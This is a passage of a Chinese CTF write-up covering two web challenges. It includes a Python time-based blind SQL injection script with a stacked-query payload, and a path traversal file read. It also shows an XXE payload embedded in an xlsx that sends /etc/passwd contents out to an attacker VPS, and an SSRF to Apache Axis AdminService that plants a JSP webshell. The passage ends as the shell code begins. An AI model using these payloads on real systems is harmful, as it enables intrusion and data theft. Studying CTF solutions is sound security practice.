<span class="keyword">break</span></span><br><span class="line">    i = i - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>注出数据库名：<code>ctf</code></p>
<p>因为<code>select</code>，<code>or</code>都被过滤了，只能盲猜列名，但是列名password又不行，所以无奈只能另寻他法</p>
<p>后面测试了<strong>堆叠注入</strong>，没想到还真有</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;;set @sql=0x73656c65637420736c656570283329;prepare test from @sql;execute test;</span><br><span class="line">0x73656c65637420736c656570283329 = &apos;select sleep(3);&apos;</span><br></pre></td></tr></table></figure>

<p>成功执行sleep(3)，于是把要执行的语句进行hex编码，进行时间盲注</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://182.92.220.157:11116/index.php?r=Login/Login"</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">"flag,user"</span></span><br><span class="line">flag = <span class="string">"AmOL#T.zip"</span></span><br><span class="line">column_name = <span class="string">"username,password"</span></span><br><span class="line">password = <span class="string">"asdfjnia@*jbfdsb!"</span><span class="comment">#admin/asdfjnia@*jbfdsb!</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#payload = "select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='user'),"+str(i)+",1))="+str(j)+",sleep(3),0);"</span></span><br><span class="line">        payload = <span class="string">"select if(ascii(substr((select group_concat(password) from user),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">",sleep(3),0);"</span></span><br><span class="line">        payload = payload.encode(<span class="string">'hex'</span>)</span><br><span class="line">        username = <span class="string">"';set @sql=0x"</span>+payload+<span class="string">";prepare test from @sql;execute test;"</span></span><br><span class="line">        <span class="comment">#username = "'^(case/**/hex(mid(flag.flag/**/from/**/"+str(i)+"))/**/when/**/"+k+hex_database+"/**/then/**/1/**/else/**/abs(-9223372036854775808)/**/end)-- -"</span></span><br><span class="line">        <span class="comment">#username = "'^(case hex(mid(database() from -1)) when 65  then 1 else abs(-9223372036854775808) end)-- -"</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"username"</span>:username,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">"1"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print username</span></span><br><span class="line">        data = json.dumps(data)</span><br><span class="line">        starttime = time.time()</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print r.text</span></span><br><span class="line">        <span class="keyword">if</span>  time.time()-starttime &gt; <span class="number">3</span>:</span><br><span class="line">            database =  database + chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>注出以下信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">database = &quot;ctf&quot;</span><br><span class="line">table_name = &quot;flag,user&quot;</span><br><span class="line">flag = &quot;AmOL#T.zip&quot;</span><br><span class="line">column_name = &quot;username,password,flag&quot;</span><br><span class="line">password = &quot;asdfjnia@*jbfdsb!&quot;#admin/asdfjnia@*jbfdsb!</span><br></pre></td></tr></table></figure>

<p><code>flag.flag</code>中的信息是<code>AmOL#T.zip</code></p>
<p>访问得到网站源码，开始审计</p>
<p>首先是路由功能文件：<strong>Common/fun.php</strong></p>
<p><img src="../../../../img/swpuctf/23.png" alt=""></p>
<p>默认访问的是<code>index.php?r=Login/Index</code>，即<code>LoginContoller.php</code>中的<code>actionIndex</code>方法</p>
<p><img src="../../../../img/swpuctf/24.png" alt=""></p>
<p>检测session的username字段，如果为空，则跳转到<strong>userLogin</strong></p>
<p>就是我们刚才注入的登陆页面了</p>
<p>看看过滤的safe方法：</p>
<p><img src="../../../../img/swpuctf/25.png" alt=""></p>
<p>发现一旦有过滤的关键字，自动返回<strong>test</strong>用户名</p>
<p><img src="../../../../img/swpuctf/26.png" alt=""></p>
<p>然后把数据库查询出的密码和我们输入的密码比较，相同则登陆成功，返回200，否则返回202，这也就解释了为什么被过滤还返回202</p>
<p>然后登陆成功后，我们可以来到用户控制器的<code>actionIndex</code>方法</p>
<p><img src="../../../../img/swpuctf/27.png" alt=""></p>
<p>把<code>$_REQUEST</code>变量覆盖后，传入<strong>/View/userIndex.php</strong></p>
<p><img src="../../../../img/swpuctf/28.png" alt=""></p>
<p>userIndex.php中，可以看到变量<code>$img_file</code>加上当前文件后传入了<code>imgToBase64</code>函数中，跟进</p>
<p><img src="../../../../img/swpuctf/29.png" alt=""></p>
<p><code>$img_file</code>文件如果存在，则把内容读取后base64编码拼接到<code>$img_base64</code></p>
<p>最后通过：<code>echo &#39;&lt;img src=&quot;&#39; . $img_base64 . &#39;&quot;&gt;&#39;;</code>显示到页面中</p>
<p>因为<code>$img_file</code>可以通过<code>$REQUEST</code><strong>变量覆盖</strong>来控制</p>
<p>于是可以路径穿越读取flag文件</p>
<p>我们先注入得到admin的密码：<strong>asdfjnia@*jbfdsb!</strong></p>
<p>登陆后，访问：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?r=User/Index&amp;img_file=/../flag.php</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/30.png" alt=""></p>
<p>成功读取flag.php</p>
<p>base64解码得到flag</p>
<p><img src="../../../../img/swpuctf/31.png" alt=""></p>
<h3 id="FFFFF"><a href="#FFFFF" class="headerlink" title="FFFFF"></a>FFFFF</h3><p>这题是肝最久的题，真的是java一考就倒，期间跟出题人交流了很多，出题人也给了很多提示。在这里向出题人说一声辛苦了~</p>
<p>首先，题目说明给的链接是：<strong><a href="http://ip/ctffffff/backups/" target="_blank" rel="noopener">http://ip/ctffffff/backups/</a></strong></p>
<p>但是，我们直接访问会出现404的情况</p>
<p><img src="../../../../img/swpuctf/32.png" alt=""></p>
<p>访问<strong>/ctffffff/</strong></p>
<p><img src="../../../../img/swpuctf/33.png" alt=""></p>
<p>一个富婆通讯录，按f进入坦克23333</p>
<p>摸了一下网站，有两个功能：</p>
<ul>
<li>导出富婆通讯录：下载下来一个<strong>xlsx</strong>后缀的<strong>excel</strong>文件</li>
<li>共享我的富婆通讯录：可以上传文件，随意传几个文件，但是只有回显<strong>上传失败</strong></li>
</ul>
<p>因为下载下来的是<strong>excel</strong>文件，所以也尝试一下上传excel文件，但是还是失败</p>
<p>另外，直接访问路径<strong>/ctffffff/flag</strong>，会出现500的情况</p>
<p><img src="../../../../img/swpuctf/34.png" alt=""></p>
<p>猜测应该是权限不够，然后就卡住了</p>
<p>直到出题人放出的第一个提示：<strong>jdk8的xxe有点不一样</strong></p>
<p>可以交互的数据就只有上传点，搜了一下<strong>excel xxe</strong>，发现了xxe的关键点：<a href="https://xz.aliyun.com/t/3741" target="_blank" rel="noopener">https://xz.aliyun.com/t/3741</a> </p>
<p>因为excel文件包含了很多xml文件，如果我们在其中的xml文件定义一个外部实体，就可能造成xxe攻击</p>
<p>首先，先新建一个空白的excel文件，然后进行解压：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir xxe &amp;&amp; <span class="built_in">cd</span> xxe</span><br><span class="line">$ unzip ../1.xlsx <span class="comment"># obviously use whatever your xlsx file is here</span></span><br><span class="line">Archive:  ../1.xlsx</span><br><span class="line">  inflating: xl/drawings/drawing1.xml</span><br><span class="line">  inflating: xl/worksheets/sheet1.xml</span><br><span class="line">  inflating: xl/worksheets/_rels/sheet1.xml.rels</span><br><span class="line">  inflating: xl/sharedStrings.xml</span><br><span class="line">  inflating: xl/styles.xml</span><br><span class="line">  inflating: xl/workbook.xml</span><br><span class="line">  inflating: xl/_rels/workbook.xml.rels</span><br><span class="line">  inflating: _rels/.rels</span><br><span class="line">  inflating: [Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>然后找到<strong>[Content_Types].xml</strong>这个文件，在其中的2-3行之间插入我们的payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % dtd SYSTEM "http://106.15.250.162/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>插入后如下图：</p>
<p><img src="../../../../img/swpuctf/35.png" alt=""></p>
<p>然后再次打包成excel文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ zip -r ../poc.xslx *</span><br></pre></td></tr></table></figure>

<p>接着上传，就能在vps成功监听到数据了：</p>
<p><img src="../../../../img/swpuctf/36.png" alt=""></p>
<p>发现版本是<strong>Java/1.8.0_222</strong></p>
<p>既然是无回显的xxe，就尝试利用<strong>oob</strong>来读取本地文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % dtd SYSTEM "http://vps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>vps上的evil.dtd写入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://yourvps:8888/?content=%file;&apos;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>但是尝试发现只有服务器访问vps的evil.dtd的记录，没有执行到<code>send</code>实体的内容。这里也是卡了很久，后面发现原来是java oob中，参数实体定义参数实体时会出现错误的情况，具体我也不是很理解，在这篇文章中有写道：<a href="https://www.leadroyal.cn/?p=914" target="_blank" rel="noopener">https://www.leadroyal.cn/?p=914</a> </p>
<p>后面改成如下payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://vps/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;send;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY send SYSTEM &apos;http://yourvps:8888/?content=%file;&apos;&gt;&quot;&gt; %payload;</span><br></pre></td></tr></table></figure>

<p>把<code>send</code>从参数实体改成一般实体后，可以成功在8888端口接收道数据，但是如果利用<code>file</code>协议oob，只能读取到<strong>1行</strong>的文件，是没有办法读取到<strong>多行</strong>文件的，而java也不存在像php那样的伪协议可以进行base64加密，把文件内容变成只有一行</p>
<p>这里又尝试了很多，比如java特别的<code>netdoc</code>协议来列目录，但是目录下的文件又必须只有一个，否则也没办法通过oob带出</p>
<p>甚至尝试了<strong>ftp</strong>协议来尝试读取多行文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">FTP</span><br><span class="line">--------------</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE a [ </span><br><span class="line">&lt;!ENTITY % asd SYSTEM &quot;http://x.x.x.x:4444/ext.dtd&quot;&gt;</span><br><span class="line">%asd;</span><br><span class="line">%c;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;rrr;&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">## External dtd ##</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;file:///proc/self/environ&quot;&gt;</span><br><span class="line">&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &apos;ftp://x.x.x.x:2121/%d;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>但是也失败了，可能因为ftp版本的限制不支持读取多行文件</p>
<p>怎么办呢，这里出题人的意图实际上就是要我们去读取一开始给的<strong>/ctffffff/backups/</strong>目录下的文件，因为这个目录下的文件只有一个，所以我们可以直接列出，通过<code>netdoc</code>，payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "netdoc:../webapps/ctffffff/backups/"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % dtd SYSTEM "http://vps/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>接收到如下信息：</p>
<p><img src="../../../../img/swpuctf/37.png" alt=""></p>
<p>访问后下载压缩包，得到部分源码</p>
<p>在<strong>Flag.class</strong>中我们看到</p>
<p><img src="../../../../img/swpuctf/39.png" alt=""></p>
<p>flag的路径在/flag，但是直接访问路由会出现500的情况，权限不够</p>
<p>另外发现了文件夹<strong>axis</strong>，查了一下发现存在<strong>java axis rce</strong>相关：<a href="http://www.lmxspace.com/2019/07/20/Axis-Rce%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/07/20/Axis-Rce%E5%88%86%E6%9E%90/</a> </p>
<p>思路是增加一个随机服务日志来写shell文件</p>
<p>尝试里面的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /axis_war/services/AdminService?wsdl HTTP/1.0</span><br><span class="line">Content-Type: text/xml; charset=utf-8</span><br><span class="line">Accept: application/soap+xml, application/dime, multipart/related, text/*</span><br><span class="line">User-Agent: Axis/1.4</span><br><span class="line">Host: locathost:8080</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">SOAPAction: &quot;&quot;</span><br><span class="line">Content-Length: 1061</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span><br><span class="line">xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class="line">xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Body&gt;</span><br><span class="line">&lt;ns1:deployment</span><br><span class="line">xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot;</span><br><span class="line">xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;</span><br><span class="line">xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;</span><br><span class="line">&lt;ns1:service name=&quot;RandomService&quot; provider=&quot;java:RPC&quot;&gt;</span><br><span class="line">&lt;requestFlow&gt;</span><br><span class="line">&lt;handler type=&quot;RandomLog&quot;/&gt;</span><br><span class="line">&lt;/requestFlow&gt;</span><br><span class="line">&lt;ns1:parameter name=&quot;className&quot; value=&quot;java.util.Random&quot;/&gt;</span><br><span class="line">&lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;</span><br><span class="line">&lt;/ns1:service&gt;</span><br><span class="line">&lt;handler name=&quot;RandomLog&quot; type=&quot;java:org.apache.axis.handlers.LogHandler&quot; &gt;  </span><br><span class="line">&lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/ROOT/shell.jsp&quot; /&gt;   </span><br><span class="line">&lt;parameter name=&quot;LogHandler.writeToConsole&quot; value=&quot;false&quot; /&gt; </span><br><span class="line">&lt;/handler&gt;</span><br><span class="line">&lt;/ns1:deployment&gt;</span><br><span class="line">&lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/40.png" alt=""></p>
<p>但是直接打会出现401，权限不够的情况</p>
<p>所以，我们就需要考虑通过ssrf的方式来写入payload，参考：<a href="https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce" target="_blank" rel="noopener">https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce</a> </p>
<p><img src="../../../../img/swpuctf/41.png" alt=""></p>
<p>里面提到了Axis api允许我们将POST请求转化成GET请求，通过传入get参数<code>method</code>和<code>param</code>参数，例如我们传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /axis/services/AdminService?method=myMethod&amp;parameter1=test1&amp;parameter2=test2</span><br></pre></td></tr></table></figure>

<p>那么就等效于POST传入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/AdminService</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span><br><span class="line">        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class="line">        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">  &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;myMethod&gt;</span><br><span class="line">      &lt;parameter1&gt;test1&lt;/parameter1&gt;</span><br><span class="line">      &lt;parameter2&gt;test2&lt;/parameter2&gt;</span><br><span class="line">    &lt;/myMethod&gt;</span><br><span class="line">  &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>拼接方式如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String body = &quot;&lt;&quot; + method + &quot;&gt;&quot; + args + &quot;&lt;/&quot; + method + &quot;&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>于是用如下方式拼接成我们的Body部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /axis/services/AdminService?method=!--&gt;&lt;myMethod+attr=&quot;x&quot;&gt;&lt;test&gt;y&lt;/test&gt;&lt;/myMethod</span><br></pre></td></tr></table></figure>

<p>将payload：（注：写入的路径是：<strong>../webapps/axis/</strong>，写入shell文件：<strong>somnus.jsp</strong>）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!--&gt;&lt;ns1:deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot; xmlns:ns1=&quot;http://xml.apache.org/axis/wsdd/&quot;&gt;&lt;ns1:service name=&quot;RandomService&quot; provider=&quot;java:RPC&quot;&gt;&lt;requestFlow&gt;&lt;handler type=&quot;RandomLog&quot;/&gt;&lt;/requestFlow&gt;&lt;ns1:parameter name=&quot;className&quot; value=&quot;java.util.Random&quot;/&gt;&lt;ns1:parameter name=&quot;allowedMethods&quot; value=&quot;*&quot;/&gt;&lt;/ns1:service&gt;&lt;handler name=&quot;RandomLog&quot; type=&quot;java:org.apache.axis.handlers.LogHandler&quot; &gt;&lt;parameter name=&quot;LogHandler.fileName&quot; value=&quot;../webapps/axis/somnus.jsp&quot; /&gt;&lt;parameter name=&quot;LogHandler.writeToConsole&quot; value=&quot;false&quot; /&gt;&lt;/handler&gt;&lt;/ns1:deployment</span><br></pre></td></tr></table></figure>

<p>进行url编码后，通过xxe来进行ssrf：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % dtd SYSTEM "http://127.0.0.1:8080/axis/services/AdminService?method=%21%2d%2d%3e%3c%6e%73%31%3a%64%65%70%6c%6f%79%6d%65%6e%74%20%78%6d%6c%6e%73%3d%22%68%74%74%70%3a%2f%2f%78%6d%6c%2e%61%70%61%63%68%65%2e%6f%72%67%2f%61%78%69%73%2f%77%73%64%64%2f%22%20%78%6d%6c%6e%73%3a%6a%61%76%61%3d%22%68%74%74%70%3a%2f%2f%78%6d%6c%2e%61%70%61%63%68%65%2e%6f%72%67%2f%61%78%69%73%2f%77%73%64%64%2f%70%72%6f%76%69%64%65%72%73%2f%6a%61%76%61%22%20%78%6d%6c%6e%73%3a%6e%73%31%3d%22%68%74%74%70%3a%2f%2f%78%6d%6c%2e%61%70%61%63%68%65%2e%6f%72%67%2f%61%78%69%73%2f%77%73%64%64%2f%22%3e%3c%6e%73%31%3a%73%65%72%76%69%63%65%20%6e%61%6d%65%3d%22%52%61%6e%64%6f%6d%53%65%72%76%69%63%65%22%20%70%72%6f%76%69%64%65%72%3d%22%6a%61%76%61%3a%52%50%43%22%3e%3c%72%65%71%75%65%73%74%46%6c%6f%77%3e%3c%68%61%6e%64%6c%65%72%20%74%79%70%65%3d%22%52%61%6e%64%6f%6d%4c%6f%67%22%2f%3e%3c%2f%72%65%71%75%65%73%74%46%6c%6f%77%3e%3c%6e%73%31%3a%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%63%6c%61%73%73%4e%61%6d%65%22%20%76%61%6c%75%65%3d%22%6a%61%76%61%2e%75%74%69%6c%2e%52%61%6e%64%6f%6d%22%2f%3e%3c%6e%73%31%3a%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%61%6c%6c%6f%77%65%64%4d%65%74%68%6f%64%73%22%20%76%61%6c%75%65%3d%22%2a%22%2f%3e%3c%2f%6e%73%31%3a%73%65%72%76%69%63%65%3e%3c%68%61%6e%64%6c%65%72%20%6e%61%6d%65%3d%22%52%61%6e%64%6f%6d%4c%6f%67%22%20%74%79%70%65%3d%22%6a%61%76%61%3a%6f%72%67%2e%61%70%61%63%68%65%2e%61%78%69%73%2e%68%61%6e%64%6c%65%72%73%2e%4c%6f%67%48%61%6e%64%6c%65%72%22%20%3e%3c%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%4c%6f%67%48%61%6e%64%6c%65%72%2e%66%69%6c%65%4e%61%6d%65%22%20%76%61%6c%75%65%3d%22%2e%2e%2f%77%65%62%61%70%70%73%2f%61%78%69%73%2f%73%6f%6d%6e%75%73%2e%6a%73%70%22%20%2f%3e%3c%70%61%72%61%6d%65%74%65%72%20%6e%61%6d%65%3d%22%4c%6f%67%48%61%6e%64%6c%65%72%2e%77%72%69%74%65%54%6f%43%6f%6e%73%6f%6c%65%22%20%76%61%6c%75%65%3d%22%66%61%6c%73%65%22%20%2f%3e%3c%2f%68%61%6e%64%6c%65%72%3e%3c%2f%6e%73%31%3a%64%65%70%6c%6f%79%6d%65%6e%74"&gt;</span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>同样方法上传后，再发现POST请求给RandomService来写入日志：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /axis/services/RandomService HTTP/1.1</span><br><span class="line">Host: 39.98.64.24:25531</span><br><span class="line">Connection: close</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">SOAPAction: something</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Length: 874</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">        &lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xmlns:api=&quot;http://127.0.0.1/Integrics/Enswitch/API&quot;</span><br><span class="line">        xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;</span><br><span class="line">        xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">        &lt;soapenv:Body&gt;</span><br><span class="line">        &lt;api:main</span><br><span class="line">        soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">            &lt;api:in0&gt;&lt;![CDATA[</span><br><span class="line">&lt;%@page import=&quot;java.util.*,java.io.*&quot;%&gt;&lt;% if 